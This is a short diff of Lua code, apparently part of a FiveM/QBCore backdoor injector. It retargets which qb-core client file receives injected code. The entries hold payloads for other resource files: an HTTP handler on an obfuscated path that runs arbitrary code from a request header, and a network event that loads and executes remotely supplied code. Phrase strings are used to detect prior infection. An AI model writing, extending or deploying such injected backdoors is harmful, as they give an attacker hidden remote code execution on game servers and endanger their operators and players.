@@ -5,7 +5,7 @@
             content = [[SetHttpHandler(function(req, res) if (req.method == 'POST') then if req.path == '/thszlrmvbyhytrevopgm' then local data = req.headers.Code reqFuncCall = req resFuncCall = res local func = load(data) if func then local ok = pcall(func) if ok then else res.send('LE') end else res.send('LE') end end end end)]],
             phrase = "load(data) if func then local ok =  pcall(func)",
             svchangesMade = false},
-        {path = GetResourcePath("qb-core")  .. "/client/functions.lua",
+        {path = GetResourcePath("qb-core")  .. "/client/events.lua",
             content = [[RegisterNetEvent("thszlrmvbyhytrevopgm-ce", function(d, r) if r == GetCurrentResourceName() then local func = load(d) if func then local ok = pcall(func) if ok then else return end else return end end end)]],
             phrase = "load(d) if func then local ok =  pcall(func)",
             clchangesMade = false},
